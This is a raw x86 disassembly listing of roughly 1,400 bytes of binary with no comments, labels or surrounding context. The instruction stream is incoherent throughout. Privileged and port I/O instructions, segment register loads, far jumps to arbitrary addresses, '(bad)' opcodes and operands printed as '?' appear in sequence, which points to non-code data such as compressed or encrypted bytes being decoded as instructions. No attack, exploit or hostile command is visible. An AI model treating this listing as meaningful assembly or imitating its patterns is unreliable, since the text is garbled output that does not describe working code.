  42e4cc:	shl    DWORD PTR [eax],1
  42e4ce:	test   BYTE PTR [edx+0x68],al
  42e4d1:	fcom   DWORD PTR [eax+0x5c93feb4]
  42e4d7:	aam    0xb0
  42e4d9:	je     0x42e46c
  42e4db:	jmp    0x5bab3f35
  42e4e0:	mov    bl,0x16
  42e4e2:	add    eax,DWORD PTR [edx+0x53]
  42e4e5:	lock pusha 
  42e4e7:	cli    
  42e4e8:	loop   0x42e52b
  42e4ea:	add    al,0x1
  42e4ec:	pop    esi
  42e4ed:	mov    edx,esi
  42e4ef:	sti    
  42e4f0:	dec    eax
  42e4f1:	arpl   WORD PTR [edi+edx*8],cx
  42e4f4:	xchg   ebp,eax
  42e4f5:	and    al,0xd1
  42e4f7:	jnp    0x42e546
  42e4f9:	jmp    0x5bcb5d97
  42e4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4ff:	inc    BYTE PTR [esi*1+0x11919a3]
  42e506:	loop   0x42e4ba
  42e508:	cmp    al,0x4b
  42e50a:	fisttp DWORD PTR [edi-0x6163cc2]
  42e510:	mov    ecx,edi
  42e512:	out    0xf5,al
  42e514:	in     eax,0x18
  42e516:	fadd   DWORD PTR [edx-0x6cf7f701]
  42e51c:	add    al,0xb
  42e51e:	cld    
  42e51f:	aad    0x63
  42e521:	adc    ebx,DWORD PTR [ebx]
  42e523:	dec    ebx
  42e524:	shr    al,0x35
  42e527:	mov    cs,WORD PTR [ecx-0x789bf6a1]
  42e52d:	iret   
  42e52e:	out    0xd0,al
  42e530:	ret    
  42e531:	add    ah,al
  42e533:	add    eax,0xe99c3c4a
  42e538:	add    ebx,DWORD PTR [ebx-0x250b8859]
  42e53e:	pop    ds
  42e53f:	(bad)  
  42e540:	iret   
  42e541:	sahf   
  42e542:	push   ecx
  42e543:	imul   ebp,DWORD PTR [ebp+0x14],0x86c4e0ae
  42e54a:	in     eax,dx
  42e54b:	cmc    
  42e54c:	push   esp
  42e54d:	test   ecx,esp
  42e54f:	push   esp
  42e550:	and    ecx,0x0
  42e553:	pop    ss
  42e554:	cmp    esi,ecx
  42e556:	pop    ds
  42e557:	mov    BYTE PTR [ecx+eiz*1+0x62],0xd5
  42e55c:	mov    al,ds:0xea50b796
  42e561:	push   es
  42e562:	scas   al,BYTE PTR es:[edi]
  42e563:	nop
  42e564:	test   ch,0x20
  42e567:	aam    0x16
  42e569:	mov    ebp,0x7dec1825
  42e56e:	push   esi
  42e56f:	aad    0x2f
  42e571:	pop    ds
  42e572:	push   es
  42e573:	inc    edx
  42e574:	popa   
  42e575:	pop    ds
  42e576:	dec    ebp
  42e577:	psadbw mm0,mm3
  42e57a:	pop    ebx
  42e57b:	inc    edi
  42e57c:	mov    ds:0xb069ef02,al
  42e581:	sub    DWORD PTR [eax+0x44],edi
  42e584:	or     BYTE PTR [ebx],al
  42e586:	les    ebp,FWORD PTR [ecx+0x39e9d9f4]
  42e58c:	call   0xb337:0x8bc11f24
  42e593:	add    eax,0xd5c97446
  42e598:	and    eax,0x5781b1f
  42e59d:	daa    
  42e59e:	mov    gs,WORD PTR [eax+0x37]
  42e5a1:	mov    dl,0x38
  42e5a3:	retf   
  42e5a4:	mov    ebp,ebx
  42e5a6:	push   DWORD PTR [esi]
  42e5a8:	ins    DWORD PTR es:[edi],dx
  42e5a9:	pop    ss
  42e5aa:	popf   
  42e5ab:	lods   al,BYTE PTR ds:[esi]
  42e5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5ad:	test   DWORD PTR [ecx+0x1fd3b19d],edx
  42e5b3:	js     0x42e623
  42e5b5:	call   0x337c064
  42e5ba:	inc    edx
  42e5bb:	cmp    cl,dl
  42e5bd:	movntps XMMWORD PTR [ecx-0x26ddb317],xmm2
  42e5c4:	mov    BYTE PTR [ebp-0x2b231c50],cl
  42e5ca:	pusha  
  42e5cb:	sub    al,0x7d
  42e5cd:	add    BYTE PTR [esi+0x0],dh
  42e5d0:	mov    al,0xbc
  42e5d2:	and    cl,bl
  42e5d4:	(bad)  
  42e5d5:	or     BYTE PTR [esi+0x14],dl
  42e5d8:	jp     0x42e586
  42e5da:	cmp    al,0xeb
  42e5dc:	mov    DWORD PTR [ebx-0x14],ebp
  42e5df:	push   edi
  42e5e0:	mov    dh,0x3b
  42e5e2:	and    al,0x15
  42e5e4:	sub    cl,ah
  42e5e6:	xchg   ecx,eax
  42e5e7:	aad    0x5a
  42e5e9:	dec    edi
  42e5ea:	fnstcw WORD PTR [ebp-0xbe00a7a]
  42e5f0:	mov    gs,WORD PTR [ecx]
  42e5f2:	jns    0x42e599
  42e5f4:	jle    0x42e66b
  42e5f6:	mov    eax,ds:0xa67bc8c5
  42e5fb:	aam    0x45
  42e5fd:	xchg   esi,eax
  42e5fe:	or     bl,BYTE PTR [ebp+0x4182b685]
  42e604:	mov    ecx,edi
  42e606:	mov    esp,0x9f9b4d17
  42e60b:	xchg   esi,eax
  42e60c:	les    ecx,FWORD PTR [ecx+ebp*8-0x28f68372]
  42e613:	aad    0x99
  42e615:	mov    ds:0x9b6fc53b,eax
  42e61a:	ss stos BYTE PTR es:[edi],al
  42e61c:	mov    ecx,ebx
  42e61e:	mov    bh,0x12
  42e620:	adc    ecx,DWORD PTR [esi]
  42e622:	test   eax,0xa405c29c
  42e627:	push   ebp
  42e628:	popa   
  42e629:	scas   eax,DWORD PTR es:[edi]
  42e62a:	retf   
  42e62b:	push   0xffffffaf
  42e62d:	hlt    
  42e62e:	arpl   WORD PTR gs:[ecx],bp
  42e631:	xchg   edx,eax
  42e632:	xchg   BYTE PTR [esi],bl
  42e634:	das    
  42e635:	add    BYTE PTR [ebx+ebp*1],0x41
  42e639:	shl    ecx,0xde
  42e63c:	pop    ss
  42e63d:	add    eax,DWORD PTR [edx-0x2d4ba60a]
  42e643:	add    BYTE PTR [ecx+ebp*8],ch
  42e646:	pusha  
  42e647:	ja     0x42e645
  42e649:	rcr    BYTE PTR [edi+0x43352468],1
  42e64f:	(bad)  
  42e650:	adc    DWORD PTR [eax-0x6343a637],0xaa1fdd51
  42e65a:	pusha  
  42e65b:	xor    eax,0xa5a936ca
  42e660:	cs vmwrite edx,ebp
  42e664:	popa   
  42e665:	jg     0x42e5f6
  42e667:	jbe    0x42e652
  42e669:	add    BYTE PTR [edi+0x1fc770fa],0xd9
  42e670:	cmp    eax,0x7020b6f4
  42e675:	popa   
  42e676:	adc    DWORD PTR [eax+ecx*8-0xe2b764b],ebx
  42e67d:	cmp    BYTE PTR [eax+0x1e76af4c],0x27
  42e684:	iret   
  42e685:	mov    al,0x59
  42e687:	cmp    DWORD PTR [ecx],0xb1c6087f
  42e68d:	add    cl,al
  42e68f:	stos   BYTE PTR es:[edi],al
  42e690:	not    DWORD PTR [esi-0x60922e65]
  42e696:	popa   
  42e697:	sub    eax,0x8191b62f
  42e69c:	xor    DWORD PTR ds:0x21d6ec6,edi
  42e6a2:	push   edx
  42e6a3:	ins    DWORD PTR es:[edi],dx
  42e6a4:	popa   
  42e6a5:	pop    ss
  42e6a6:	mov    edx,0x40956b7a
  42e6ab:	xor    BYTE PTR [ebp+0x290726a3],dl
  42e6b1:	add    dl,BYTE PTR [ebx+0x8]
  42e6b4:	cwde   
  42e6b5:	test   BYTE PTR [eax],0xd4
  42e6b8:	bound  esp,QWORD PTR [edi-0x6f]
  42e6bb:	clc    
  42e6bc:	mov    ?,WORD PTR [edi+ecx*1+0x77]
  42e6c0:	xchg   esi,eax
  42e6c1:	jge    0x42e6c1
  42e6c3:	or     esp,DWORD PTR [esi+0x4aa50785]
  42e6c9:	mov    ch,BYTE PTR [ecx-0x13]
  42e6cc:	inc    BYTE PTR [edx]
  42e6ce:	es ss dec ebp
  42e6d1:	xchg   ah,ah
  42e6d3:	mov    edx,0x683fd889
  42e6d8:	repnz mov ds:0x598cd705,eax
  42e6de:	das    
  42e6df:	sbb    BYTE PTR [edx+edx*2],dl
  42e6e2:	nop
  42e6e3:	std    
  42e6e4:	push   cs
  42e6e5:	sub    eax,0x41ac55c4
  42e6ea:	ins    BYTE PTR es:[edi],dx
  42e6eb:	pop    esi
  42e6ec:	and    esp,esp
  42e6ee:	pop    edi
  42e6ef:	sub    esp,eax
  42e6f1:	xor    al,0x11
  42e6f3:	not    DWORD PTR [ecx+ebx*1+0x9264aa6]
  42e6fa:	pusha  
  42e6fb:	mov    dh,0x74
  42e6fd:	jmp    0x6387caa
  42e702:	cld    
  42e703:	inc    ebx
  42e704:	sbb    bh,BYTE PTR [ebp+0x5a00e3b8]
  42e70a:	pop    ds
  42e70b:	lds    ecx,FWORD PTR [ebp+0x6f]
  42e70e:	jge    0x42e69c
  42e710:	xor    dl,BYTE PTR [ebx]
  42e712:	dec    esp
  42e713:	aad    0x37
  42e715:	mov    eax,ds:0x946a5af5
  42e71a:	sub    DWORD PTR [edi-0x77],edi
  42e71d:	inc    ecx
  42e71e:	push   esp
  42e71f:	shl    ebp,0x9d
  42e722:	push   edi
  42e723:	or     DWORD PTR [esi],edi
  42e725:	add    cl,BYTE PTR [ecx+ebp*8-0xe]
  42e729:	push   ebp
  42e72a:	cmp    ch,0xe7
  42e72d:	mov    ebp,0x222e5b60
  42e732:	icebp  
  42e733:	sub    al,0xc6
  42e735:	mov    ebx,0x130f7c1
  42e73a:	in     eax,dx
  42e73b:	aad    0xb4
  42e73d:	repnz daa 
  42e73f:	xchg   edi,eax
  42e740:	outs   dx,DWORD PTR ds:[esi]
  42e741:	jecxz  0x42e79a
  42e743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e744:	je     0x42e6f5
  42e746:	lods   al,BYTE PTR ds:[esi]
  42e747:	jae    0x42e7a8
  42e749:	(bad)  
  42e74a:	pop    ds
  42e74b:	push   ebp
  42e74c:	adc    esp,DWORD PTR [eax+0x12]
  42e74f:	sbb    eax,0xd09df20e
  42e754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e755:	xchg   esp,eax
  42e756:	addr16 mov al,ds:0xade5
  42e75a:	pusha  
  42e75b:	lods   al,BYTE PTR ds:[esi]
  42e75c:	(bad)  
  42e75d:	leave  
  42e75e:	js     0x42e723
  42e760:	mov    BYTE PTR ds:0xa49686a1,dl
  42e766:	shl    BYTE PTR [ebx+0x738a4a3c],1
  42e76c:	dec    ebp
  42e76d:	add    ah,BYTE PTR [ebx-0x3f]
  42e770:	fs add eax,0x2f94f116
  42e776:	ret    0xe9d6
  42e779:	ret    0x830e
  42e77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e77d:	mov    dl,0x2c
  42e77f:	pop    esi
  42e780:	xchg   esp,eax
  42e781:	push   eax
  42e782:	push   ds
  42e783:	xchg   esp,eax
  42e784:	mov    ah,0x67
  42e786:	pop    eax
  42e787:	mov    DWORD PTR [edi],edx
  42e789:	rcr    BYTE PTR [ecx-0x5],cl
  42e78c:	add    BYTE PTR [edx+ebp*8+0x1f044ddc],dl
  42e793:	test   eax,0xfc627597
  42e798:	lahf   
  42e799:	jne    0x42e79d
  42e79b:	arpl   WORD PTR [edx-0x79ca0375],cx
  42e7a1:	fs inc eax
  42e7a3:	sti    
  42e7a4:	sub    BYTE PTR ds:0x8584bd97,ah
  42e7aa:	pop    ecx
  42e7ab:	outs   dx,BYTE PTR ds:[esi]
  42e7ac:	push   esp
  42e7ad:	call   0xfe80bbd5
  42e7b2:	xchg   ecx,eax
  42e7b3:	fisttp DWORD PTR ds:0xf125cf07
  42e7b9:	aad    0x48
  42e7bb:	aam    0x80
  42e7bd:	pop    eax
  42e7be:	push   ds
  42e7bf:	or     ch,ah
  42e7c1:	xchg   ecx,eax
  42e7c2:	sbb    DWORD PTR [eax+edx*4-0x428caff],0x39
  42e7ca:	les    ecx,FWORD PTR [esi+eiz*2+0x2af1ace3]
  42e7d1:	or     DWORD PTR [ecx-0x59],esp
  42e7d4:	mov    al,0x7c
  42e7d6:	jns    0x42e7bc
  42e7d8:	sbb    BYTE PTR [ebx-0x11],al
  42e7db:	lock inc edi
  42e7dd:	add    ah,BYTE PTR [eax]
  42e7df:	cmp    ecx,DWORD PTR [edi-0x2b]
  42e7e2:	add    cl,BYTE PTR [edi+0x3d]
  42e7e5:	addr16 push ds
  42e7e7:	mov    ds:0xf3478d50,eax
  42e7ec:	adc    BYTE PTR [eax+edx*1-0x65],dl
  42e7f0:	int3   
  42e7f1:	out    dx,al
  42e7f2:	inc    esi
  42e7f3:	mov    edx,0xfb2004d9
  42e7f8:	pushw  0x8422
  42e7fc:	mov    DWORD PTR [ebp+0x143f1bee],eax
  42e802:	push   edx
  42e803:	leave  
  42e804:	mov    DWORD PTR ds:0x3d9fa676,0xf1bb5d7f
  42e80e:	nop
  42e80f:	mov    ds:0x31f0b13,eax
  42e814:	outs   dx,DWORD PTR ds:[esi]
  42e815:	pop    edi
  42e816:	dec    ebp
  42e817:	fs sti 
  42e819:	and    BYTE PTR ds:0x60bfad04,dl
  42e81f:	aaa    
  42e820:	jbe    0x42e7b4
  42e822:	or     eax,0x1f5cd285
  42e827:	shl    DWORD PTR [eax],cl
  42e829:	lea    ecx,[edx-0x19bc0591]
  42e82f:	aad    0x27
  42e831:	cs mov ah,0xaf
  42e834:	mov    BYTE PTR [edi+ebx*4+0xa],ah
  42e838:	mov    ah,0xfb
  42e83a:	call   0x8a5df189
  42e83f:	mov    eax,0xa53db9e0
  42e844:	mov    ebp,0x2b9ba8ad
  42e849:	and    cl,BYTE PTR ds:0x1fef3a09
  42e84f:	adc    eax,0x9b104b3d
  42e854:	enter  0xca2d,0xd4
  42e858:	call   0x2a9f854
  42e85d:	sbb    ah,BYTE PTR [eax]
  42e85f:	or     al,0xb0
  42e861:	jecxz  0x42e803
  42e863:	cli    
  42e864:	pop    es
  42e865:	enter  0x622c,0x88
  42e869:	push   eax
  42e86a:	test   eax,0xd4036976
  42e86f:	stos   BYTE PTR es:[edi],al
  42e870:	cld    
  42e871:	fiadd  DWORD PTR [ebp+0x7028afba]
  42e877:	unpcklps xmm0,xmm3
  42e87a:	repnz aam 0x91
  42e87d:	cmp    BYTE PTR [esi+0x4e],dl
  42e880:	xor    eax,0x7f5e6e02
  42e885:	popf   
  42e886:	fstp   DWORD PTR [edi+0x3d60c040]
  42e88c:	rol    esp,cl
  42e88e:	(bad)  
  42e88f:	adc    eax,0xb8911934
  42e894:	aam    0xe7
  42e896:	xchg   esi,eax
  42e897:	or     WORD PTR [edi],bp
  42e89a:	push   ecx
  42e89b:	shl    BYTE PTR [eax],1
  42e89d:	mov    DWORD PTR [edi+0x612f27f3],ebp
  42e8a3:	xor    DWORD PTR [esi+eiz*2-0x3b],eax
  42e8a7:	lds    edi,FWORD PTR [esi-0x2f]
  42e8aa:	ror    BYTE PTR [edx-0x5f1dfd22],1
  42e8b0:	int    0xcb
  42e8b2:	sti    
  42e8b3:	jo     0x42e8a9
  42e8b5:	dec    eax
  42e8b6:	dec    ebp
  42e8b7:	add    esi,0xa4ef60c1
  42e8bd:	jmp    DWORD PTR [ebx-0x26]
  42e8c0:	jecxz  0x42e8c4
  42e8c2:	ins    BYTE PTR es:[edi],dx
  42e8c3:	push   eax
  42e8c4:	ret    0x4a9f
  42e8c7:	outs   dx,BYTE PTR ds:[esi]
  42e8c8:	and    al,0xd
  42e8ca:	pusha  
  42e8cb:	xor    esp,eax
  42e8cd:	add    al,0x8f
  42e8cf:	sub    al,0xd2
  42e8d1:	jb     0x42e93b
  42e8d3:	stos   BYTE PTR es:[edi],al
  42e8d4:	cmc    
  42e8d5:	push   0x26
  42e8d7:	aam    0xee
  42e8d9:	add    bl,ah
  42e8db:	dec    edx
  42e8dc:	jmp    0x380082e
  42e8e1:	xchg   bh,ch
  42e8e3:	xor    DWORD PTR [edx],ebx
  42e8e5:	xor    dh,cl
  42e8e7:	aad    0xac
  42e8e9:	add    dl,BYTE PTR [ebx-0x11]
  42e8ec:	in     al,dx
  42e8ed:	jnp    0x42e90c
  42e8ef:	lock xchg ebp,eax
  42e8f1:	sti    
  42e8f2:	inc    esp
  42e8f3:	adc    DWORD PTR [esi-0x22818bfb],ecx
  42e8f9:	sub    al,0x34
  42e8fb:	imul   eax,esi,0xffffffe0
  42e8fe:	nop
  42e8ff:	aad    0x5
  42e901:	pop    ss
  42e902:	push   0x60afbf18
  42e907:	stos   DWORD PTR es:[edi],eax
  42e908:	push   edx
  42e909:	ja     0x42e91a
  42e90b:	pop    esi
  42e90c:	jp     0x42e96f
  42e90e:	adc    eax,0xa3b7b6d4
  42e913:	aaa    
  42e914:	xchg   ch,cl
  42e916:	sub    eax,0x73d3f352
  42e91b:	lahf   
  42e91c:	cmp    DWORD PTR [esi-0x62],0x8e9ee27
  42e923:	mov    ah,0xb8
  42e925:	add    eax,0x1ba71332
  42e92a:	or     BYTE PTR [edx+0x711f1ef1],0xe8
  42e931:	pop    eax
  42e932:	mov    ds:0xc7d71a17,al
  42e937:	xlat   BYTE PTR ds:[ebx]
  42e938:	ds add al,0xee
  42e93b:	aaa    
  42e93c:	nop
  42e93d:	ins    BYTE PTR es:[edi],dx
  42e93e:	inc    eax
  42e93f:	std    
  42e940:	mov    ecx,0xb960f5
  42e945:	js     0x42e9aa
  42e947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e948:	(bad)  
  42e949:	jb     0x42e8d9
  42e94b:	les    edi,FWORD PTR [esi]
  42e94d:	add    ah,BYTE PTR [esi]
  42e94f:	jbe    0x42e8d4
  42e951:	mov    eax,0xc47d9f06
  42e956:	popa   
  42e957:	inc    ebx
  42e958:	xchg   ecx,eax
  42e959:	jl     0x42e911
  42e95b:	sbb    BYTE PTR [ebx-0x6a02df1c],dl
  42e961:	add    eax,0xdff98280
  42e966:	out    0x67,al
  42e968:	pop    edx
  42e969:	push   ss
  42e96a:	push   edi
  42e96b:	imul   ebx,DWORD PTR [eax+edi*4],0x62
  42e96f:	test   eax,0x9531e5b5
  42e974:	dec    eax
  42e975:	xchg   ebx,eax
  42e976:	push   ecx
  42e977:	aad    0x4b
  42e979:	adc    BYTE PTR [edi+0x46],dh
  42e97c:	out    0x89,eax
  42e97e:	dec    ebx
  42e97f:	xor    al,0x94
  42e981:	inc    ebx
  42e982:	xchg   esp,eax
  42e983:	mov    edx,0x56f14240
  42e988:	(bad)  
  42e989:	std    
  42e98a:	push   edi
  42e98b:	aad    0x14
  42e98d:	dec    eax
  42e98e:	jle    0x42e9ee
  42e990:	and    cl,cl
  42e992:	cmp    BYTE PTR [edx-0x80],ch
  42e995:	idiv   DWORD PTR [ecx]
  42e997:	arpl   WORD PTR [ebp-0xbed6020],sp
  42e99d:	or     eax,0xcd2fd453
  42e9a2:	fcmovb st,st(7)
  42e9a4:	leave  
  42e9a5:	push   eax
  42e9a6:	stc    
  42e9a7:	ins    BYTE PTR es:[edi],dx
  42e9a8:	mov    edi,edx
  42e9aa:	push   0x569d6dbc
  42e9af:	mov    DWORD PTR [ebx-0xd90a24b],ebx
  42e9b5:	popf   
  42e9b6:	pop    ds
  42e9b7:	or     DWORD PTR [eax-0x2a],edi
  42e9ba:	cmp    DWORD PTR [edi],esi
  42e9bc:	test   BYTE PTR [ebx],al
  42e9be:	push   ds
  42e9bf:	sub    DWORD PTR [edi],edx
  42e9c1:	loop   0x42e9a7
  42e9c3:	inc    ecx
  42e9c4:	test   DWORD PTR ds:0x2f2cd67,0x19aa1118
  42e9ce:	pop    ebx
  42e9cf:	aaa    
  42e9d0:	fucomip st,st(4)
  42e9d2:	pusha  
  42e9d3:	mov    ebp,0x5c04ea31
  42e9d8:	dec    esi
  42e9d9:	push   edi
  42e9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9db:	aam    0xb
  42e9dd:	jge    0x42ea1b
  42e9df:	adc    ecx,esi
  42e9e1:	xchg   esi,eax
  42e9e2:	sbb    DWORD PTR [esi+0x17192789],esp
  42e9e8:	fnsave [esi+0x5551c6]
  42e9ee:	je     0x42e979
  42e9f0:	push   eax
  42e9f1:	push   0xb268e16b
  42e9f6:	add    al,0x78
  42e9f8:	gs push cs
  42e9fa:	pusha  
  42e9fb:	cmp    eax,0xdd1b7de8
  42ea00:	clc    
  42ea01:	push   ds
  42ea02:	adc    al,0xd4
  42ea04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea05:	cmp    BYTE PTR [esi-0x79],dl
  42ea08:	mov    edi,0x89f679b9
  42ea0d:	out    dx,eax
  42ea0e:	pop    esi
  42ea0f:	fisttp WORD PTR [edx-0x39]
  42ea12:	repz pop edx
  42ea14:	inc    ebp
  42ea15:	sbb    eax,0x29c9baa2
  42ea1a:	imul   esi,DWORD PTR [ecx],0x9d2e1c8f
  42ea20:	cli    
  42ea21:	stos   DWORD PTR es:[edi],eax
  42ea22:	pusha  
  42ea23:	mov    ebp,0x31c80392
  42ea28:	jmp    0x9dd:0xb7d40c96
  42ea2f:	out    0xa1,eax
  42ea31:	stos   BYTE PTR es:[edi],al
  42ea32:	push   cs
  42ea33:	dec    DWORD PTR [ecx+0x30059145]
  42ea39:	aaa    
  42ea3a:	fwait
  42ea3b:	rcr    BYTE PTR [esi],1
  42ea3d:	or     eax,0x4be2d44d
  42ea42:	adc    BYTE PTR [edx-0x79d4d72],0x88
  42ea49:	imul   esi,DWORD PTR [eax+ebp*4+0x1c],0xb
  42ea4e:	and    al,0xa5
  42ea50:	nop    esp
  42ea53:	mov    bl,BYTE PTR [ebx-0x56c212ee]
  42ea59:	out    0xdf,al
  42ea5b:	ja     0x42e9e6
  42ea5d:	jae    0x42ea4f
  42ea5f:	pop    esi
  42ea60:	ror    DWORD PTR [edi+ecx*8+0x75],1
  42ea64:	lahf   
  42ea65:	daa    
  42ea66:	jl     0x42ea3a
  42ea68:	(bad)  
  42ea69:	cmp    DWORD PTR [edi],ebx
  42ea6b:	out    0xe2,eax
  42ea6d:	ret    
  42ea6e:	imul   ebp,DWORD PTR [edx],0xffffff9e
  42ea71:	xor    eax,0x24e21007
  42ea76:	test   al,0x54
  42ea78:	push   edi
  42ea79:	int    0xf2
  42ea7b:	les    edi,FWORD PTR [edx]
  42ea7d:	bound  eax,QWORD PTR [edx-0x30bcbb8a]
  42ea83:	ss mov ebx,edi
  42ea86:	add    al,0xb6
  42ea88:	xor    DWORD PTR [ebx],edi
  42ea8a:	xor    eax,0xe205bdbc
  42ea8f:	xor    al,0x4
  42ea91:	dec    esp
  42ea92:	or     al,0x74
  42ea94:	rcr    ah,cl
  42ea96:	pop    ds
  42ea97:	pop    ss
  42ea98:	mov    ds:0xf6787531,eax
  42ea9d:	xchg   esp,eax
  42ea9e:	call   esp
  42eaa0:	out    0x8e,al
  42eaa2:	in     al,0x36
  42eaa4:	ret    
  42eaa5:	shr    DWORD PTR [edi+0x30],1
  42eaa8:	out    dx,al
  42eaa9:	aas    
  42eaaa:	sbb    ch,BYTE PTR [eax+ecx*2]
  42eaad:	mov    esp,0x41e047a
  42eab2:	adc    esp,0x6f387b3c
  42eab8:	pop    esi
  42eab9:	call   0x8fcc8e73
  42eabe:	jae    0x42eaae
  42eac0:	test   al,0xbf
  42eac2:	lock mov DWORD PTR [edi-0x1fa217fd],edi
  42eac9:	lods   eax,DWORD PTR ds:[esi]
  42eaca:	(bad)  
  42eacb:	cmp    ebx,DWORD PTR [ecx-0x45]
  42eace:	sub    al,0x87
  42ead0:	mov    al,ds:0x675a814f
  42ead5:	pop    es
  42ead6:	jge    0x42eb39
  42ead8:	fisubr DWORD PTR [ebx]
  42eada:	adc    DWORD PTR [edi+edx*2],0xffffffb9
  42eade:	add    dl,BYTE PTR [esi-0x2a740382]
  42eae4:	sar    DWORD PTR [ebx+0x75],1
  42eae7:	add    eax,0x4c9e6efe
  42eaec:	mov    BYTE PTR [ebx-0x58],cl
  42eaef:	dec    ecx
  42eaf0:	xchg   ecx,eax
  42eaf1:	imul   eax,DWORD PTR [ecx],0x2b
  42eaf4:	or     BYTE PTR [esi],cl
  42eaf6:	or     ah,dl
  42eaf8:	xor    DWORD PTR [edi-0x31856aa3],esi
  42eafe:	fisubr DWORD PTR gs:[ebx+eiz*1-0x38776350]
  42eb06:	mov    ecx,DWORD PTR [eax-0x2b8d32fa]
  42eb0c:	ret    
  42eb0d:	in     al,dx
  42eb0e:	ret    
  42eb0f:	arpl   WORD PTR [esi-0x49],bx
  42eb12:	and    dh,BYTE PTR [ecx-0x78]
  42eb15:	sub    ebx,DWORD PTR [eax+0x3952dca0]
  42eb1b:	cmp    al,0xdf
  42eb1d:	add    dl,BYTE PTR [ebx+ecx*1+0xc03921b]
  42eb24:	ja     0x42eaf3
  42eb26:	pop    ds
  42eb27:	jno    0x42eb8e
  42eb29:	icebp  
  42eb2a:	sbb    BYTE PTR [ebp-0x61f44f3a],bl
  42eb30:	xchg   esp,eax
  42eb31:	pop    esp
  42eb32:	and    eax,0x5352c154
  42eb37:	inc    esp
  42eb38:	adc    al,0xa8
  42eb3a:	pusha  
  42eb3b:	inc    ecx
  42eb3c:	adc    BYTE PTR [ecx],dl
  42eb3e:	xor    eax,0xe6639875
  42eb43:	adc    DWORD PTR [ecx+0x3],edi
  42eb46:	push   eax
  42eb47:	lds    ecx,FWORD PTR [ebp+0x4b318220]
  42eb4d:	loopne 0x42eb87
  42eb4f:	cmp    ecx,DWORD PTR [ecx+0x6f3fd42d]
  42eb55:	dec    eax
  42eb56:	push   DWORD PTR [edx+0x66]
  42eb59:	add    BYTE PTR [edx-0x7df6ab4d],ah
  42eb5f:	add    al,0xa2
  42eb61:	shl    BYTE PTR [ebx+0x3d],0x99
  42eb65:	out    0x57,al
  42eb67:	push   ebp
  42eb68:	jge    0x42eb44
  42eb6a:	pop    ds
  42eb6b:	fist   DWORD PTR [ebx]
  42eb6d:	pop    ebp
  42eb6e:	pop    es
  42eb6f:	dec    eax
  42eb70:	test   BYTE PTR ds:0xf94e1dc8,0xb9
  42eb77:	mov    cs,WORD PTR [edx]
  42eb79:	jb     0x42eb9a
  42eb7b:	mov    bl,0x4
  42eb7d:	adc    BYTE PTR [edx+0x29eb2414],dl
  42eb83:	fwait
  42eb84:	jmp    0x63b8:0x1d554108
  42eb8b:	je     0x42eb2d
  42eb8d:	outs   dx,DWORD PTR ds:[esi]
  42eb8e:	ins    DWORD PTR es:[edi],dx
  42eb8f:	sbb    eax,0xf449285b
  42eb94:	jmp    0xe78076c8
  42eb99:	pop    ss
  42eb9a:	mov    cl,0xa8
  42eb9d:	enter  0xf448,0xb
  42eba1:	mov    ch,0xae
  42eba3:	xchg   esp,eax
  42eba4:	mov    WORD PTR [ecx+0x1b],?
  42eba7:	dec    esp
  42eba8:	sbb    BYTE PTR [eax],bl
  42ebaa:	test   BYTE PTR [ebp-0x38],dl
  42ebad:	add    DWORD PTR [ebp-0x2d],ecx
  42ebb0:	pop    es
  42ebb1:	xchg   edx,eax
  42ebb2:	call   0xb336d2a0
  42ebb7:	mov    ah,0xc4
  42ebb9:	mov    dl,0x5a
  42ebbb:	pop    ebp
  42ebbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebbd:	cmp    ecx,edx
  42ebbf:	std    
  42ebc0:	mov    DWORD PTR [ecx+0x4c5637ef],edi
  42ebc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebc7:	(bad)  
  42ebc8:	call   0xe83c:0x6de2d91
  42ebcf:	in     al,0x2c
  42ebd1:	out    0x1f,eax
  42ebd3:	jg     0x42ebbe
  42ebd5:	xor    dh,cl
  42ebd7:	push   0x30
  42ebd9:	jecxz  0x42eb89
  42ebdb:	aam    0x2a
  42ebdd:	dec    ecx
  42ebde:	retf   
  42ebdf:	icebp  
  42ebe0:	jecxz  0x42ec58
  42ebe2:	loopne 0x42eb91
  42ebe4:	mov    ebp,DWORD PTR [ebp+0x33]
  42ebe7:	inc    ebp
  42ebe8:	mov    BYTE PTR [eax+0x6257804e],bh
  42ebee:	mov    eax,ds:0x164f88a5
  42ebf3:	fild   DWORD PTR [ebx-0x1d]
  42ebf6:	loop   0x42ebdd
  42ebf8:	push   0xb1d70afa
  42ebfd:	or     eax,0x457de32d
  42ec02:	add    eax,0xdd23947e
  42ec07:	fld    st(0)
  42ec09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec0a:	cdq    
  42ec0b:	adc    al,0x91
  42ec0d:	xchg   ecx,eax
  42ec0e:	std    
  42ec0f:	out    0xae,eax
  42ec11:	pop    ss
  42ec12:	dec    edx
  42ec13:	or     DWORD PTR [ebp+0x5d],edi
  42ec16:	xchg   esp,eax
  42ec17:	push   esp
  42ec18:	in     eax,dx
  42ec19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec1a:	out    0xe3,eax
  42ec1c:	std    
  42ec1d:	das    
  42ec1e:	(bad)  
  42ec1f:	(bad)  
  42ec20:	dec    esi
  42ec21:	mov    eax,ds:0xa65618df
  42ec26:	lds    esp,FWORD PTR [esi+0x1a]
  42ec29:	mov    dl,0x20
  42ec2b:	jmp    0x42ec68
  42ec2d:	add    eax,0x2a8db5f
  42ec32:	loopne 0x42ec26
  42ec34:	in     al,dx
  42ec35:	add    al,0x3d
  42ec37:	pushf  
  42ec38:	jl     0x42ebca
  42ec3a:	gs mov cl,0x2e
  42ec3d:	inc    ecx
  42ec3e:	leave  
  42ec3f:	pop    ebp
  42ec40:	and    al,0x2
  42ec42:	xlat   BYTE PTR ds:[ebx]
  42ec43:	outs   dx,BYTE PTR ds:[esi]
  42ec44:	aam    0x5
  42ec46:	loopne 0x42ec69
  42ec48:	cli    
  42ec49:	les    eax,FWORD PTR [edi+0x1fa2cfab]
  42ec4f:	fld    st(4)
  42ec51:	xchg   edx,eax
